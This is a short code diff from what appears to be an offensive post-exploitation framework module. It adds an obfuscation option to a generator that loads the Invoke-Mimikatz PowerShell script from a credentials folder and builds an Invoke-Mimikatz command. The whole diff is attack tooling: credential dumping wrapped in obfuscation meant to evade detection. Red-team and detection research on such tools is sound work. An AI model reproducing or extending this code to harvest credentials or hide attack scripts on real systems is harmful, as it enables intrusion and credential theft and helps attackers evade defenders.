@@ -57,11 +57,13 @@ class Module:
                 self.options[option]['Value'] = value
 
 
-    def generate(self):
+    def generate(self, obfuscate=False, obfuscationCommand=""):
         
         # read in the common module source code
         moduleSource = self.mainMenu.installPath + "/data/module_source/credentials/Invoke-Mimikatz.ps1"
-
+        if obfuscate:
+            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
+            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
         try:
             f = open(moduleSource, 'r')
         except:
@@ -74,7 +76,9 @@ class Module:
         script = moduleCode
 
         # build the custom command with whatever options we want
-        script += "Invoke-Mimikatz -Command "
-        script += "'\"" + self.options['Command']['Value'] + "\"'"
-
+        scriptEnd = "Invoke-Mimikatz -Command "
+        scriptEnd += "'\"" + self.options['Command']['Value'] + "\"'"
+        if obfuscate:
+            scriptEnd = helpers.obfuscate(psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
+        script += scriptEnd
         return script
